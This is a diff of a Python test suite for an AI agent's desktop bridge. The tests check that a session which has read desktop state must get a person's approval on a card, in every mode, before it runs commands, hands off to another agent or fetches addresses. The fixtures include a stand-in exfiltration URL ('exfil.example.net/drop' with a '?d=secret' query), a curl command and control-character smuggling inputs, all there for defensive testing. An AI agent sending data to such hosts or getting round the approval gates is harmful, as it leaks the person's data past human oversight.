@@ -55,7 +55,7 @@ What it is actually checking, in one line each:
     not begin, clears it; a desktop that is down, garbled, older or unsure leaves it the same,
     tainted scope; only a caller the desktop attributes to the Lens conversation follows it, so a
     background or unattributable caller stays tainted across the person's + and is not told that +
-    clears it; a scope read back from disk does not untaint; and YOS_MCP_NO_TAINT is what it was
+    clears it; a scope read back from disk does not untaint; and YOS_MCP_NO_TAINT is honoured only on a machine that declares it
     (E.REF1, 15 Oct 2026; security review of #817);
   * what a describe taints (#1062): `os_describe {app, actions}` answers action signatures only,
     judged from the answer (a sentinel, then indented lines), so a `yos` that prints state anyway
@@ -108,6 +108,24 @@ STATE = os.environ["FAKE_YOS_STATE"]
 def load():
     with open(STATE) as fh:
         return json.load(fh)
+
+def child_token():
+    # How the real `yos` is handed the bridge's agent token: a pipe's descriptor named by
+    # YANTRIK_AGENT_TOKEN_FD, read once (never the environment, which /proc keeps). Recorded as
+    # `env_token` below so the cases that follow it still read what they always read; the plain
+    # variable is recorded too, as `plain_env`, and must stay empty.
+    if not _TOKEN:
+        fd = os.environ.get("YANTRIK_AGENT_TOKEN_FD")
+        if fd:
+            try:
+                _TOKEN.append(os.read(int(fd), 512).decode().strip())
+            except (OSError, ValueError):
+                _TOKEN.append(None)
+        else:
+            _TOKEN.append(os.environ.get("YANTRIK_AGENT_TOKEN"))
+    return _TOKEN[0]
+
+_TOKEN = []
 
 def save(s):
     # Written beside and renamed over. This was `open(STATE, "w")`, which truncates the file
@@ -224,6 +242,22 @@ SHELL_ACTIONS = """  act: open_app(name)  [standard, settles later]
   act: agent_kill(job)  [standard, settles later]
        Stop one of your commands.
          job: string - the job id agent_run answered with
+  act: workshop_create(name)  [sensitive, settles on return]
+       Ask the person for a workshop. The person allows each one on a card, in every mode.
+         name: string - a plain name
+  act: agent_run_sealed(command, workshop, cwd?, wait?)  [standard, settles later]
+       Run one command line in your workshop, sealed.
+         command: string - one command line
+         workshop: string - your workshop folder
+  act: workshop_present(workshop, path)  [standard, settles on return]
+       Show a media file from your workshop in the OS's player.
+         workshop: string - your workshop folder
+         path: string - the file
+  act: workshop_export(workshop, path, to)  [sensitive, settles later]
+       Copy a file out of your workshop. The person allows each one on a card, in every mode.
+         workshop: string - your workshop folder
+         path: string - the file or folder
+         to: string - videos, or a folder in the home
   act: new_agent(mind, task)  [sensitive, settles on return]
        Start another agent and give it a task.
          mind: string - which mind
@@ -488,7 +522,7 @@ if argv[:1] == ["act"]:
         # tokenless gateway bridge included, answers `follows: false` and is told nothing more.
         main = lens.get("main_token")
         follows = (lens.get("follows", True) if main is None
-                   else os.environ.get("YANTRIK_AGENT_TOKEN") == main)
+                   else child_token() == main)
         if not follows and main is not None:
             envelope({"follows": False, "said": "This bridge carries no agent token, so the desktop "
                       "cannot tell which of the mind's sessions a call comes from."})
@@ -511,7 +545,9 @@ if argv[:1] == ["act"]:
     # real `yos` sends it beside the arguments), and the whole command line, which any user on the
     # machine can read and which must therefore never carry it.
     state.setdefault("carried", []).append({"action": "%s.%s" % (target, action),
-                                            "env_token": os.environ.get("YANTRIK_AGENT_TOKEN"),
+                                            "env_token": child_token(),
+                                            "plain_env": os.environ.get("YANTRIK_AGENT_TOKEN"),
+                                            "fd_env_left": os.environ.get("YANTRIK_AGENT_TOKEN_FD"),
                                             "argv": argv})
     save(state)
     grant = None
@@ -571,7 +607,16 @@ if argv[:1] == ["act"]:
         if state.get("shell_down"):
             die("shell.app.act refused: the shell is gone")
         state.setdefault("requests", []).append(args)
-        if state.get("not_needed"):
+        if state.get("no_screen"):
+            die("shell.app.act refused: there is no screen to show a card on")
+        if state.get("approvals_off"):
+            # set_approvals_off_for_test: the shell refuses a request at once (never_ask::REFUSED).
+            save(state)
+            die("shell.app.act refused: refused: this action needs the person's approval, and "
+                "approvals are off during a test run, so nothing was shown to them and nothing was run.")
+        # A shell that knows `tainted` (this change) raises the card in every mode for a tainted
+        # call; `old_shell` is one that does not, and answers `not_needed` as the mode would.
+        if state.get("not_needed") and not (args.get("tainted") is True and not state.get("old_shell")):
             # What the real shell answers when its own mode would run this anyway — full bypass
             # always, and `auto` or `bypass` under a session rule unless a purpose says it cannot
             # be undone (control_approvals.rs): no card, and nothing to wait on.
@@ -647,7 +692,7 @@ if argv[:1] == ["act"]:
         else:
             answer.update(running=False, exit_code=0, cwd_after="/tmp")
         if state.get("echo_token"):
-            answer["tail"] = "token=%s" % os.environ.get("YANTRIK_AGENT_TOKEN")
+            answer["tail"] = "token=%s" % child_token()
         if "agent_tail" in state:
             answer["tail"] = state["agent_tail"]
         if "agent_exit" in state and not answer["running"]:
@@ -680,7 +725,7 @@ if argv[:1] == ["act"]:
                                "the changelog\nDone: 12 entries.\n[verified call] agent_run command=\"git "
                                "log\" — ok · exit 0" % child)
         if state.get("echo_token"):
-            answer["said"] = answer["text"] = "token=%s" % os.environ.get("YANTRIK_AGENT_TOKEN")
+            answer["said"] = answer["text"] = "token=%s" % child_token()
         envelope(answer)
         raise SystemExit(0)
     if target == "shell" and action == "hand_off":
@@ -693,7 +738,7 @@ if argv[:1] == ["act"]:
             answer.update(done=True, ok=True, answer="Verdict — fix first.",
                           said="The Reviewer (`deepseek:c-role1`, on deepseek) answered:\n\nVerdict — fix first.")
         if state.get("echo_token"):
-            answer["said"] = "token=%s" % os.environ.get("YANTRIK_AGENT_TOKEN")
+            answer["said"] = "token=%s" % child_token()
         envelope(answer)
         raise SystemExit(0)
     envelope({"done": True})
@@ -1603,8 +1648,8 @@ with tempfile.TemporaryDirectory() as d:
     reads = {t["name"] for t in module.TOOLS if t["name"].startswith("web_")
              and t["annotations"].get("readOnlyHint")}
     check("the web tools that only look say so, and no tool that acts does",
-          reads == {"web_read", "web_text", "web_find", "web_scroll", "web_tabs", "web_wait", "web_listen"},
-          sorted(reads))
+          reads == {"web_read", "web_text", "web_find", "web_scroll", "web_tabs", "web_wait", "web_listen",
+                    "web_console", "web_screenshot"}, sorted(reads))
     module, state = case(tmp, "web-page-refusal", mode="auto")
     text, is_error = module.run_tool(module.BY_NAME["web_click"], {"ref": "e404"})
     check("the page's own no is a policy answer: nothing was run, and not a failure to retry",
@@ -1922,17 +1967,16 @@ with tempfile.TemporaryDirectory() as d:
           typed(module).startswith("REFUSED") and "os_describe" in typed(module))
     check("and the reads are carried into it", read(state)["lens"]["read"] == ["os_describe"], read(state)["lens"])
 
-    # TAINT_OFF is what it was: nothing refused, and nothing asked of the desktop about scopes.
-    os.environ["YOS_MCP_NO_TAINT"] = "1"
-    try:
-        module, state = case(tmp, "scope-taint-off", mode="auto", machine_ceiling="dangerous",
-                             ceiling=None, lens=lens(first))
-        module.run_tool(module.BY_NAME["os_describe"], {"app": "calendar"})
-        check("with YOS_MCP_NO_TAINT=1, nothing is refused and no scope is read or marked",
-              not typed(module).startswith("REFUSED") and not read(state).get("taint_calls"),
-              read(state).get("taint_calls"))
-    finally:
-        os.environ.pop("YOS_MCP_NO_TAINT", None)
+    # TAINT_OFF is what it was on a machine that declares it (`taint_off_declared`; the marker is
+    # root's, which this test is not, so the flag is set as that function would have): nothing
+    # refused, and nothing asked of the desktop about scopes.
+    module, state = case(tmp, "scope-taint-off", mode="auto", machine_ceiling="dangerous",
+                         ceiling=None, lens=lens(first))
+    module.TAINT_OFF = True
+    module.run_tool(module.BY_NAME["os_describe"], {"app": "calendar"})
+    check("on a machine that declares it, nothing is refused and no scope is read or marked",
+          not typed(module).startswith("REFUSED") and not read(state).get("taint_calls"),
+          read(state).get("taint_calls"))
 
     # Screen text is the other program's: the bridge's rewording of yos's advice stays out of it.
     fenced = ("(more state: `yos describe shell`)\n--- screen text begins (drawn by other programs) ---\n"
@@ -2168,8 +2212,12 @@ with tempfile.TemporaryDirectory() as d:
     # `app-shell.sock` is the shell before it writes anything there. That is only this bridge's
     # check too while it opens no socket of its own.
     source = SOURCE.read_text(encoding="utf-8")
-    check("the bridge opens no socket itself, so yos's check of the shell's peer is its check",
-          "socket.socket(" not in source and "AF_UNIX" not in source, None)
+    # The one socket it may open is the harness's token service, in take_agent_token (#411): a path
+    # its harness named, read once. Never a desktop socket.
+    taken = source.split("def take_agent_token", 1)[1].split("AGENT_TOKEN = take_agent_token()", 1)[0]
+    check("the bridge opens no desktop socket itself, so yos's check of the shell's peer is its check",
+          source.count("socket.socket(") == 1 and source.count("AF_UNIX") == 1 and "socket.socket(" in taken
+          and "app-shell" not in taken, None)
     check("and the one place the two differ is named in the file, not excused here",
           all(v.get("door") == "refuse" and v.get("outcome") == "allow" and v.get("mode") == "plan"
               for v in doors if v.get("note")) and any(v.get("note") for v in doors), None)
@@ -2351,6 +2399,9 @@ with tempfile.TemporaryDirectory() as d:
           [(c["action"], c["env_token"]) for c in s.get("carried", [])])
     check("and it is nowhere a person or another user could read it", not leaks(state, text, noise),
           leaks(state, text, noise))
+    check("a child `yos` is handed it through a pipe's descriptor, never in its environment (#411)",
+          s.get("carried") and all(c.get("plain_env") in (None, "") for c in s["carried"]),
+          [(c["action"], c.get("plain_env")) for c in s.get("carried", [])])
     check("the mind is told where it ran and how it ended",
           "not in the person's Terminal" in text and "exit code 0" in text and "allowed this once" in text,
           text)
@@ -2627,7 +2678,7 @@ with tempfile.TemporaryDirectory() as d:
     # never run unasked from here: the card's sentence makes it ask in every mode but full bypass,
     # and there, where no card can be raised, the hand-off is refused.
     module, state = case(tmp, "handoff-taint-not-needed", mode="bypass_all", ceiling=None,
-                         machine_ceiling="dangerous", token=TOKEN, not_needed=True)
+                         machine_ceiling="dangerous", token=TOKEN, not_needed=True, old_shell=True)
     module.run_tool(module.BY_NAME["os_describe"], {"app": "calendar"})
     told = module.call_tool(module.AGENT_BY_NAME["send_to_agent"], {"agent": CHILD, "text": "Dentist"})
     reqs = read(state).get("requests", [])
@@ -2700,7 +2751,7 @@ with tempfile.TemporaryDirectory() as d:
         ("terminal.run", lambda m: act(m, "terminal", "run", {"command": CURL}),
          ("terminal", "run"), {"terminal_open": True}),
     )
-    for mode in ("auto", "bypass"):
+    for mode in ("ask", "auto", "bypass", "bypass_all"):
         for name, call, want, desktop in commands:
             s, _ = tainted_command(name, mode, call, want, **desktop)
             check("allowed, it runs once, with the grant it was minted for (%s, %s)" % (name, mode),
@@ -2729,10 +2780,11 @@ with tempfile.TemporaryDirectory() as d:
                               ("shell", "agent_run"), answer="denied", token=TOKEN)
     check("refused, a tainted command does not run, and the mind reads REFUSED",
           not s.get("acted") and text.startswith("REFUSED"), (text[:160], s.get("acted")))
-    # Full bypass raises no card: the real shell answers `not_needed`. The command still does not
+    # An older shell, which does not know `tainted`, raises no card in full bypass. The command still does not
     # run unasked; it is refused, in words that say so.
     module, state = case(tmp, "command-taint-bypass_all", mode="bypass_all", ceiling=None,
-                         machine_ceiling="dangerous", token=TOKEN, rules=RULED, not_needed=True)
+                         machine_ceiling="dangerous", token=TOKEN, rules=RULED, not_needed=True,
+                         old_shell=True)
     module.run_tool(module.BY_NAME["os_describe"], {"app": "shell"})
     text = module.call_tool(module.AGENT_BY_NAME["run_command"], {"command": CURL})[0]
     s = read(state)
@@ -2769,18 +2821,245 @@ with tempfile.TemporaryDirectory() as d:
     check("an action the app says runs anything asks too, from a tainted session",
           [(r.get("app"), r.get("action")) for r in read(state).get("requests", [])]
           == [("scripts", "run")], read(state))
-    # YOS_MCP_NO_TAINT=1 turns the whole rule off, this part included.
-    os.environ["YOS_MCP_NO_TAINT"] = "1"
-    try:
-        module, state = case(tmp, "command-taint-off", mode="auto", ceiling=None, token=TOKEN,
-                             rules=RULED)
-        module.run_tool(module.BY_NAME["os_describe"], {"app": "shell"})
-        module.call_tool(module.AGENT_BY_NAME["run_command"], {"command": CURL})
-    finally:
-        os.environ.pop("YOS_MCP_NO_TAINT", None)
-    check("with YOS_MCP_NO_TAINT=1, the session's rule answers it as it did",
+    # A machine that declares it holds no person's data turns the whole rule off, this part included.
+    module, state = case(tmp, "command-taint-off", mode="auto", ceiling=None, token=TOKEN,
+                         rules=RULED)
+    module.TAINT_OFF = True
+    module.run_tool(module.BY_NAME["os_describe"], {"app": "shell"})
+    module.call_tool(module.AGENT_BY_NAME["run_command"], {"command": CURL})
+    check("on a machine that declares it, the session's rule answers it as it did",
           not read(state).get("requests")
           and [a["action"] for a in read(state).get("acted", [])] == ["agent_run"], read(state))
+
+    # 23v. A tainted hand-off, command or new address asks in EVERY mode. In full bypass it used to be
+    # refused, because the shell raised no card: the person's most permissive mode was the strictest.
+    # Now the bridge tells the shell (`tainted`), which raises the card in every mode; the one named
+    # exception to full bypass asking nothing. Never run unasked, and plan mode still refuses first.
+    LADDER_ALL = module.LADDER
+    for mode in ("plan", "ask", "auto", "bypass", "bypass_all"):
+        for level in LADDER_ALL:
+            for undo in (False, True):
+                for opened in (False, True):
+                    kw = dict(runs_anything=opened)
+                    base = module.decide(level, "shell", "agent_run", undo, mode, RULED[:1], "dangerous", **kw)
+                    hot = module.decide(level, "shell", "agent_run", undo, mode, RULED[:1], "dangerous",
+                                        tainted=True, **kw)
+                    want = ("ask", None) if base[0] == "run" else base
+                    check("decide: %s/%s/undo=%s/open=%s tainted is %s" % (mode, level, undo, opened, want[0]),
+                          hot == want and hot[0] != "run", (base, hot))
+                    check("decide: %s/%s/undo=%s/open=%s untainted is the table, unchanged" % (mode, level, undo, opened),
+                          module.decide(level, "shell", "agent_run", undo, mode, RULED[:1], "dangerous",
+                                        tainted=False, **kw) == base, base)
+    sinks = (
+        ("command", lambda m: m.call_tool(m.AGENT_BY_NAME["run_command"], {"command": CURL}),
+         ("shell", "agent_run"), "agent_run"),
+        ("hand-off", lambda m: m.call_tool(m.AGENT_BY_NAME["send_to_agent"], {"agent": CHILD, "text": "Dentist"}),
+         ("shell", "send_to_agent"), "send_to_agent"),
+    )
+    for name, call, want, action in sinks:
+        for mode in ("plan", "ask", "auto", "bypass", "bypass_all"):
+            for answer in ("granted", "denied"):
+                module, state = case(tmp, "everymode-%s-%s-%s" % (name, mode, answer), mode=mode, ceiling=None,
+                                     machine_ceiling="dangerous", rules=RULED, token=TOKEN, answer=answer)
+                module.run_tool(module.BY_NAME["os_describe"], {"app": "shell"})
+                text = call(module)[0]
+                s = read(state)
+                ran = [(a["app"], a["action"], a.get("grant")) for a in s.get("acted", [])
+                       if a["action"] == action]
+                label = "%s, %s, person %s" % (name, mode, answer)
+                if mode == "plan":
+                    check("tainted %s: plan mode refuses it and nobody is asked" % label,
+                          not s.get("requests") and not ran and "plan mode" in text, (text, s))
+                    continue
+                check("tainted %s: a card is raised, told it is tainted" % label,
+                      [(r["app"], r["action"], r.get("tainted")) for r in s.get("requests", [])]
+                      == [want + (True,)], s.get("requests"))
+                if answer == "granted":
+                    check("tainted %s: runs once, with the grant it was minted for" % label,
+                          ran == [want + ("appr-1",)] and not s.get("audited"), (ran, s.get("audited")))
+                else:
+                    check("tainted %s: refused, not run" % label, not ran and text.startswith("REFUSED"), (text, ran))
+        for mode in ("ask", "auto", "bypass", "bypass_all"):
+            module, state = case(tmp, "everymode-clean-%s-%s" % (name, mode), mode=mode, ceiling=None,
+                                 machine_ceiling="dangerous", rules=RULED, token=TOKEN)
+            call(module)
+            s = read(state)
+            check("untainted %s, %s: as the mode says, with nothing about the taint on the request" % (name, mode),
+                  not any("tainted" in r for r in s.get("requests", []))
+                  and (mode != "bypass_all" or (not s.get("requests") and [a["action"] for a in s.get("acted", [])
+                                                 if a["action"] == action] == [action])), s)
+    # A grant is one call's: a second command in full bypass is a second card, a second grant.
+    module, state = case(tmp, "everymode-two-calls", mode="bypass_all", ceiling=None,
+                         machine_ceiling="dangerous", rules=RULED, token=TOKEN)
+    module.run_tool(module.BY_NAME["os_describe"], {"app": "shell"})
+    module.call_tool(module.AGENT_BY_NAME["run_command"], {"command": CURL})
+    module.call_tool(module.AGENT_BY_NAME["run_command"], {"command": "ls /"})
+    s = read(state)
+    check("each tainted call in full bypass has a card and a grant of its own, bound to its own arguments",
+          [a.get("grant") for a in s.get("acted", []) if a["action"] == "agent_run"] == ["appr-1", "appr-2"]
+          and len({json.dumps(r["args_json"], sort_keys=True) for r in s["requests"]}) == 2, s)
+    # Approvals off for a test run, or no card to show: a refusal that names why, never a run.
+    for mode in ("ask", "bypass_all"):
+        module, state = case(tmp, "everymode-approvals-off-" + mode, mode=mode, ceiling=None,
+                             machine_ceiling="dangerous", rules=RULED, token=TOKEN, approvals_off=True)
+        module.run_tool(module.BY_NAME["os_describe"], {"app": "shell"})
+        text = module.call_tool(module.AGENT_BY_NAME["run_command"], {"command": CURL})[0]
+        check("approvals off for a test run (%s): refused, naming that reason, not run" % mode,
+              text.startswith("REFUSED") and "approvals are off during a test run" in text
+              and "never run unasked" in text and "ceiling" not in text
+              and not [a for a in read(state).get("acted", []) if a["action"] == "agent_run"], text)
+    module, state = case(tmp, "everymode-no-card", mode="bypass_all", ceiling=None, machine_ceiling="dangerous",
+                         rules=RULED, token=TOKEN, no_screen=True)
+    module.run_tool(module.BY_NAME["os_describe"], {"app": "shell"})
+    text = module.call_tool(module.AGENT_BY_NAME["run_command"], {"command": CURL})[0]
+    check("no card can be shown: refused with that reason, not a ceiling's",
+          text.startswith("REFUSED") and "could not be asked" in text and "no screen to show a card on" in text
+          and "never run unasked" in text and "ceiling" not in text
+          and not [a for a in read(state).get("acted", []) if a["action"] == "agent_run"], text)
+
+    # 23w. Declared sinks (review of #1080, M1): an action says in its own purpose that it fetches an
+    # address or that what it is given may leave the machine, and a tainted conversation is asked
+    # about it in every mode, with no name added to the bridge. `download-manager.add` is the first.
+    FETCHER = ("Downloads - 0 queued\nrevision: d0d0\n{\n  \"queued\": 0\n}\n"
+               "  act: add(url, save_dir)  [sensitive, settles later]\n"
+               "       Download a URL to this machine. It fetches the address in `url`.\n"
+               "         url: string - The http(s) URL to fetch\n"
+               "         save_dir?: string - Directory to save into\n")
+    SENDER = ("Reporter - 1 problem\nrevision: e1e1\n{\n  \"problems\": 1\n}\n"
+              "  act: report(note)  [sensitive, settles later]\n"
+              "       Send a report. What it is given may leave this machine.\n"
+              "         note: string - what was happening\n")
+    NEW = "https://exfil.example.net/drop"
+    apps = {"downloads": FETCHER, "reporter": SENDER}
+    for mode in ("ask", "auto", "bypass", "bypass_all"):
+        for answer in ("granted", "denied"):
+            module, state = case(tmp, "declared-fetch-%s-%s" % (mode, answer), mode=mode, answer=answer,
+                                 machine_ceiling="dangerous", ceiling=None, apps_text=apps)
+            module.run_tool(module.BY_NAME["os_describe"], {"app": "shell"})
+            text, _ = act(module, "downloads", "add", {"url": NEW})
+            s = read(state)
+            ran = [a for a in s.get("acted", []) if a["action"] == "add"]
+            check("tainted downloads.add in %s, person %s: one card showing the whole address, %s" % (
+                  mode, answer, "fetched once with its grant" if answer == "granted" else "nothing fetched"),
+                  len(s.get("requests", [])) == 1 and s["requests"][0].get("tainted") is True
+                  and ("Fetches " + NEW + ".") in str(s["requests"][0].get("purpose"))
+                  and ((len(ran) == 1 and ran[0].get("grant") == "appr-1") if answer == "granted" else not ran),
+                  (text, s.get("requests"), ran))
+        module, state = case(tmp, "declared-send-%s" % mode, mode=mode, machine_ceiling="dangerous",
+                             ceiling=None, apps_text=apps)
+        module.run_tool(module.BY_NAME["os_describe"], {"app": "shell"})
+        act(module, "reporter", "report", {"note": "the calendar says dentist"})
+        s = read(state)
+        check("tainted reporter.report in %s: a card, told it is tainted, then it runs once" % mode,
+              [(r["app"], r["action"], r.get("tainted")) for r in s.get("requests", [])] == [("reporter", "report", True)]
+              and [a["action"] for a in s.get("acted", []) if a["action"] == "report"] == ["report"], s)
+        module, state = case(tmp, "declared-clean-%s" % mode, mode=mode, machine_ceiling="dangerous",
+                             ceiling=None, apps_text=apps, rules=[{"app": "downloads", "action": "add"},
+                                                                  {"app": "reporter", "action": "report"}])
+        act(module, "downloads", "add", {"url": NEW})
+        act(module, "reporter", "report", {"note": "x"})
+        check("untainted, a declared sink is the mode's own answer, with no taint on the request (%s)" % mode,
+              not any("tainted" in r for r in read(state).get("requests", [])), read(state).get("requests"))
+    module, state = case(tmp, "declared-fetch-bypass_all-clean", mode="bypass_all", machine_ceiling="dangerous",
+                         ceiling=None, apps_text=apps)
+    act(module, "downloads", "add", {"url": NEW})
+    check("untainted downloads.add in full bypass runs with nobody asked, as before",
+          not read(state).get("requests") and [a["action"] for a in read(state).get("acted", [])] == ["add"], read(state))
+    module, state = case(tmp, "declared-fetch-plan", mode="plan", machine_ceiling="dangerous", ceiling=None,
+                         apps_text=apps)
+    module.run_tool(module.BY_NAME["os_describe"], {"app": "shell"})
+    text, _ = act(module, "downloads", "add", {"url": NEW})
+    check("in plan mode a tainted fetch is refused by the mode and nobody is asked",
+          not read(state).get("requests") and not read(state).get("acted") and "plan mode" in text, text)
+    # Visited-or-ask, as `go`: an address the session has been to, with nothing in it, is free.
+    module, state = case(tmp, "declared-fetch-visited", mode="bypass_all", machine_ceiling="dangerous",
+                         ceiling=None, apps_text=apps)
+    module.run_tool(module.BY_NAME["os_describe"], {"app": "shell"})
+    module._VISITED.add(module.visited_form(NEW))
+    act(module, "downloads", "add", {"url": NEW})
+    check("a tainted fetch of an address already visited, with no data in it, is not asked",
+          not read(state).get("requests") and len(read(state).get("acted", [])) >= 1, read(state))
+    act(module, "downloads", "add", {"url": NEW + "?d=secret"})
+    check("but the same address with a query is asked, whole",
+          len(read(state).get("requests", [])) == 1 and NEW + "?d=secret" in read(state)["requests"][0]["purpose"],
+          read(state).get("requests"))
+    # The card shows, the grant binds and the app is sent one ASCII form of the address.
+    module, state = case(tmp, "declared-fetch-wire", mode="auto", machine_ceiling="dangerous", ceiling=None,
+                         apps_text=apps)
+    module.run_tool(module.BY_NAME["os_describe"], {"app": "shell"})
+    hidden = "https://a.example/x" + chr(0xFE0F) + "y"
+    act(module, "downloads", "add", {"url": hidden})
+    wire = module.wire_address(hidden)
+    s = read(state)
+    check("a fetched address is carried in its ASCII form: shown, bound and sent alike",
+          wire and wire != hidden and s["requests"][0]["args_json"].get("url") == wire
+          and [a["args"].get("url") for a in s.get("acted", []) if a["action"] == "add"] == [wire], s)
+    # One parse (review of #1080, H1): the taint judges exactly what is sent. A raw tab or newline in
+    # JSON text used to fail the taint's strict parse while the send's lenient one read the address.
+    GETTER = ("Getter - 0\nrevision: a1a1\n{\n  \"n\": 0\n}\n"
+              "  act: get(url)  [sensitive, settles later]\n"
+              "       Fetch one page. It fetches the address in `url`.\n"
+              "         url: string - the page\n")
+    SDK = ("Sdkapp - 0\nrevision: b2b2\n{\n  \"n\": 0\n}\n"
+           "  act: pull(url)  [sensitive, settles later]\n"
+           "       Pull a feed.\n"
+           "         url: string - the feed\n")
+    apps2 = dict(apps, getter=GETTER, sdkapp=SDK)
+    TAB, NL = chr(9), chr(10)
+    text_tab = '{"url": "' + NEW + "/x" + TAB + '"}'
+    text_nl = '{"url": "' + NEW + "/x" + NL + 'y", "save_dir": "a' + NL + 'b"}'
+    cases = (
+        ("a dict", "downloads", "add", {"url": NEW + "/x"}),
+        ("JSON text", "downloads", "add", '{"url": "' + NEW + '/x"}'),
+        ("JSON text with a raw tab", "downloads", "add", text_tab),
+        ("JSON text with a raw newline", "downloads", "add", text_nl),
+        ("a bare value for a one-parameter fetch", "getter", "get", NEW + "/x"),
+        ("an undeclared address parameter (an SDK app)", "sdkapp", "pull", {"url": NEW + "/x"}),
+    )
+    for label, app, action, given in cases:
+        module, state = case(tmp, "onepart-" + label.split()[1] + str(len(label)), mode="bypass_all", machine_ceiling="dangerous",
+                             ceiling=None, apps_text=apps2)
+        module.run_tool(module.BY_NAME["os_describe"], {"app": "shell"})
+        module.run_tool(module.BY_NAME["os_act"], {"app": app, "action": action, "args": given})
+        s = read(state)
+        sent = [a["args"].get("url") for a in s.get("acted", []) if a["action"] == action]
+        asked = s.get("requests", [])
+        check("tainted, %s: asked with the taint, and what is sent is what was shown" % label,
+              len(asked) == 1 and asked[0].get("tainted") is True and len(sent) == 1
+              and sent[0] == asked[0]["args_json"].get("url") and sent[0].startswith(NEW), (asked, s.get("acted")))
+    for label, app, action, given in (
+            ("a bare value for a two-parameter fetch", "downloads", "add", NEW + "/x"),
+            ("a nested value", "downloads", "add", {"url": {"a": "b"}}),
+            ("a key carrying the address after an =", "downloads", "add", {"url=" + NEW + "/x": ""}),
+            ("no address at all", "downloads", "add", {"save_dir": "/tmp"}),
+            ("an empty address", "downloads", "add", {"url": ""}),
+            ("no arguments", "downloads", "add", None)):
+        module, state = case(tmp, "onepart-bad-" + str(len(label)) + label.split()[1], mode="bypass_all",
+                             machine_ceiling="dangerous", ceiling=None, apps_text=apps2)
+        module.run_tool(module.BY_NAME["os_describe"], {"app": "shell"})
+        text, _ = module.run_tool(module.BY_NAME["os_act"], dict({"app": app, "action": action},
+                                                                  **({"args": given} if given is not None else {})))
+        check("tainted, %s: refused, nothing fetched and nobody asked" % label,
+              not [a for a in read(state).get("acted", []) if a["action"] == action]
+              and not read(state).get("requests") and text.startswith("REFUSED"), (text, read(state)))
+    module, state = case(tmp, "onepart-untainted-tab", mode="bypass_all", machine_ceiling="dangerous",
+                         ceiling=None, apps_text=apps2)
+    module.run_tool(module.BY_NAME["os_act"], {"app": "downloads", "action": "add", "args": text_tab})
+    check("untainted, JSON text with a raw tab is sent as it always was, with nobody asked",
+          not read(state).get("requests") and len([a for a in read(state).get("acted", []) if a["action"] == "add"]) == 1,
+          read(state))
+    check("browser_args reads what act_pairs sends, a control character included",
+          module.browser_args({"app": "downloads", "action": "add", "args": text_tab}).get("url") == NEW + "/x" + TAB
+          and module.browser_args({"app": "downloads", "action": "add", "args": {"url=" + NEW: ""}}).get("url") == NEW + "="
+          and module.browser_args({"app": "downloads", "action": "add", "args": "no object here"}) == {}, "")
+
+    # Held to the Rust declarations, so a rewording on one side fails here.
+    rust = (HERE.parent.parent / "crates" / "yantrik-ipc-contracts" / "src" / "control_surface.rs").read_text(encoding="utf-8")
+    check("the declared sentences are the Rust constants",
+          'pub const LEAVES_MACHINE: &str = "%s";' % module.LEAVES_MACHINE in rust
+          and 'format!("It fetches the address in `{param}`.")' in rust
+          and module.fetch_param("x. It fetches the address in `url`.") == "url"
+          and module.fetch_param("It fetches the address in ``.") == "", "")
 
     # 23d. In `auto`, new_agent runs unasked and is written down — without the token; a token a
     # mind puts among the arguments is dropped; and one the desktop echoes back is scrubbed.
@@ -3218,9 +3497,9 @@ with tempfile.TemporaryDirectory() as d:
         check("when the person %s, web_go opens nothing and says so" % label,
               text.startswith("REFUSED") and not any(w[0] == "go" for w in s.get("web", []))
               and len(s["requests"]) == 1 and not is_error, (text, s.get("web")))
-    # Full bypass raises no card, and a tainted address is never opened unasked.
+    # An older shell raises no card in full bypass, and a tainted address is never opened unasked.
     module, state = case(tmp, "go-card-not-needed", mode="bypass_all", ceiling=None,
-                         machine_ceiling="dangerous", not_needed=True)
+                         machine_ceiling="dangerous", not_needed=True, old_shell=True)
     module.run_tool(module.BY_NAME["os_describe"], {"app": "calendar"})
     text, _ = module.run_tool(module.BY_NAME["web_go"], {"url": TAHOE})
     check("where the shell raises no card, a tainted address is refused, not opened unasked",
@@ -3232,6 +3511,24 @@ with tempfile.TemporaryDirectory() as d:
     text, _ = module.run_tool(module.BY_NAME["web_go"], {"url": TAHOE})
     check("in plan mode a tainted web_go is refused by the mode and nobody is asked",
           text.startswith("REFUSED") and not read(state).get("requests"), text)
+    # A new address from a tainted conversation asks in every mode, full bypass included.
+    for mode in ("ask", "auto", "bypass", "bypass_all"):
+        for answer in ("granted", "denied"):
+            module, state = case(tmp, "go-everymode-%s-%s" % (mode, answer), mode=mode, answer=answer,
+                                 machine_ceiling="dangerous", ceiling=None)
+            module.run_tool(module.BY_NAME["os_describe"], {"app": "calendar"})
+            text, _ = module.run_tool(module.BY_NAME["web_go"], {"url": TAHOE})
+            s = read(state)
+            opened = [w for w in s.get("web", []) if w[0] == "go"]
+            check("tainted web_go in %s, person %s: one card, bound to the address, %s" % (mode, answer,
+                  "opened once" if answer == "granted" else "nothing opened"),
+                  len(s.get("requests", [])) == 1 and s["requests"][0].get("tainted") is True
+                  and s["requests"][0]["args_json"].get("url") == TAHOE
+                  and (len(opened) == 1) == (answer == "granted"), (text, s.get("requests"), s.get("web")))
+    module, state = case(tmp, "go-clean-bypass_all", mode="bypass_all", machine_ceiling="dangerous", ceiling=None)
+    module.run_tool(module.BY_NAME["web_go"], {"url": TAHOE})
+    check("untainted web_go in full bypass opens with nobody asked, as before",
+          not read(state).get("requests") and [w[0] for w in read(state).get("web", [])] == ["go"], read(state))
     # Where it has been, without data in the address, it still goes back unasked.
     module, state = case(tmp, "go-card-visited", mode="auto", machine_ceiling="dangerous", ceiling=None)
     module.run_tool(module.BY_NAME["web_go"], {"url": TAHOE})
@@ -3260,15 +3557,12 @@ with tempfile.TemporaryDirectory() as d:
     check("when the person cannot be asked, nothing opens, and the answer says so in words that are true",
           text.startswith("REFUSED") and not any(w[0] == "go" for w in read(state).get("web", []))
           and "could not be asked about opening this address" in text, text)
-    # The rule is the taint's: YOS_MCP_NO_TAINT=1 turns it off, as it turned the whole rule off.
-    os.environ["YOS_MCP_NO_TAINT"] = "1"
-    try:
-        module, state = case(tmp, "go-card-taint-off", mode="auto", machine_ceiling="dangerous", ceiling=None)
-        module.run_tool(module.BY_NAME["os_describe"], {"app": "calendar"})
-        module.run_tool(module.BY_NAME["web_go"], {"url": TAHOE})
-        check("with YOS_MCP_NO_TAINT=1 nobody is asked", not read(state).get("requests"), read(state))
-    finally:
-        os.environ.pop("YOS_MCP_NO_TAINT", None)
+    # The rule is the taint's: a machine that declares it turns it off, as it turned the whole rule off.
+    module, state = case(tmp, "go-card-taint-off", mode="auto", machine_ceiling="dangerous", ceiling=None)
